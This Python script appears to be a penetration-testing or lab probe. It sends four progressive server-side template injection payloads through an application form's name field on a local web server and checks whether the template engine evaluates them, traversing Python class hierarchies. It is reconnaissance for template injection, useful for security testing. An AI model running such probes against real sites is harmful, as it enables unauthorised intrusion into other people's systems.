import requests
import re

session = requests.Session()
base_url = "http://127.0.0.1:32856"

# Establish session first
print("[*] Establishing session...")
init_response = session.get(f"{base_url}/application")
print(f"[+] Session established - Status: {init_response.status_code}\n")

# Define SSTI payloads to test progressively
payloads = [
    "{{''.__class__}}",
    "{{''.__class__.__mro__}}",
    "{{''.__class__.__mro__[1]}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}"
]

print("="*80)
print("TESTING SSTI PAYLOADS - Object Hierarchy Traversal")
print("="*80 + "\n")

for i, payload in enumerate(payloads, 1):
    print(f"[TEST {i}/4] Payload: {payload}")
    print("-" * 80)
    
    data = {
        "name": payload,
        "email": "test@example.com",
        "phone": "1234567890",
        "experience": "5",
        "license": "ABC123"
    }
    
    try:
        response = session.post(f"{base_url}/submit", data=data)
        
        print(f"Status Code: {response.status_code}")
        print(f"Response Length: {len(response.text)} bytes")
        print(f"\nFull Response:\n{response.text}")
        
        # Extract the "Thank you" message if present
        thank_you_match = re.search(r'Thank you[^<]*', response.text)
        if thank_you_match:
            print(f"\n[!] Thank You Message: {thank_you_match.group()}")
        
        # Check for SSTI execution indicators
        if "<class" in response.text:
            print(f"[!] SSTI CONFIRMED - Class object detected in response!")
        elif "tuple" in response.text or "object" in response.text:
            print(f"[!] SSTI LIKELY - Object references detected!")
        elif payload.replace("{{", "").replace("}}", "") not in response.text:
            print(f"[+] Payload was processed (not reflected verbatim)")
        else:
            print(f"[~] Payload reflected verbatim (may be filtered)")
            
    except Exception as e:
        print(f"[ERROR] Request failed: {str(e)}")
    
    print("\n" + "="*80 + "\n")

print("[*] SSTI Object Hierarchy Traversal Testing Complete")

